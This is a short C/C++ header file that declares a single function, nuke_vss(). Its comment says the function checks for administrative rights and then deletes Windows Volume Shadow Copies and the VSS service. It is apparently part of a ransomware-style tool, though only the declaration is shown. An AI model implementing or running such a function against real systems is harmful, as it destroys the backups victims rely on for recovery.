#ifndef DEL_SHADOWS_H
#define DEL_SHADOWS_H


/// <summary>
/// This function is used for deleting Volume Shadow Copies Service (VSS) and 
/// its associated service. Additionally, it performs privilege verification to 
/// check whether we have administrative rights or not before nuking VSS.
/// </summary>
/// <returns></returns>
bool nuke_vss();

#endif
